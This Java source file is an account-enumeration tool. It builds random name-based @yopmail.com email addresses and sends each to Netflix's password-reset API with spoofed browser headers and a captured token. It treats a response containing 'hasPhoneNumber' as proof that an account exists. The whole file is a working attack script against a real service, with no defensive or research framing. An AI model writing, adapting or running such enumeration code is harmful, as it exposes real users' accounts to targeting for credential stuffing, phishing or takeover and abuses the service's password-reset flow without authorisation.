package netl;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Random;
import java.util.Scanner;

import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;

class Main {

	public static void main(String[] args) throws Exception {

		final Random random = new Random(666);

		final HashMap<String, String> names = loadNames(random);

		names.forEach((first, last) -> {
			final String email = first + last + "@yopmail.com";
			try {
				System.out.println(email+" : "+exists(email));
			} catch (Exception e) {
				e.printStackTrace();
			}
		});
	}

	private static boolean exists(String email) throws Exception {

		HttpPost post = new HttpPost("https://www.netflix.com/api/shakti/v1b6f8cb8/login/help");

		String json = "{\"fields\":{\"forgotPasswordChoice\":{\"value\":\"email\"},\"email\":\""+email+"\"},\"mode\":\"enterPasswordReset\",\"action\":\"nextAction\",\"authURL\":\"1585332137927.XPCObMn7KRRV0Gao6CSZQ0dm3rA=\"}";
		StringEntity entity = new StringEntity(json);
		post.setEntity(entity);

		post.addHeader("Accept", "application/json, text/javascript, */*; q=0.01");
		post.addHeader("Content-Type", "application/json");
		post.addHeader("Origin", "https://www.netflix.com");
		post.addHeader("Referer", "https://www.netflix.com/dz-en/LoginHelp");
		post.addHeader("User-Agent",
				"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36");
		post.addHeader("X-Requested-With", "XMLHttpRequest");


		try (CloseableHttpClient httpClient = HttpClients.createDefault();
				CloseableHttpResponse response = httpClient.execute(post)) {

			return EntityUtils.toString(response.getEntity()).contains("hasPhoneNumber");
		}

	}

	private static HashMap<String, String> loadNames(final Random random) throws Exception {

		final HashMap<String, String> map = new HashMap<String, String>();
		final ArrayList<String> firstNames = readLines("first-names.txt");
		final ArrayList<String> lastNames = readLines("names.txt");

		int index = firstNames.size() > lastNames.size() ? lastNames.size() : firstNames.size();

		for (int i = 0; i < index; i++) {
			final String firstName = firstNames.get(random.nextInt(index));
			final String lastName = lastNames.get(random.nextInt(index));

			if (map.containsKey(firstName) && map.get(firstName).equalsIgnoreCase(lastName))
				continue;
			map.put(firstName, lastName);
		}

		return map;
	}

	private static ArrayList<String> readLines(final String filePath) throws Exception {
		final File file = new File(filePath);
		final ArrayList<String> list = new ArrayList<String>();
		Scanner sc = new Scanner(file);

		while (sc.hasNextLine())
			list.add(sc.nextLine());

		sc.close();

		return list;
	}

}
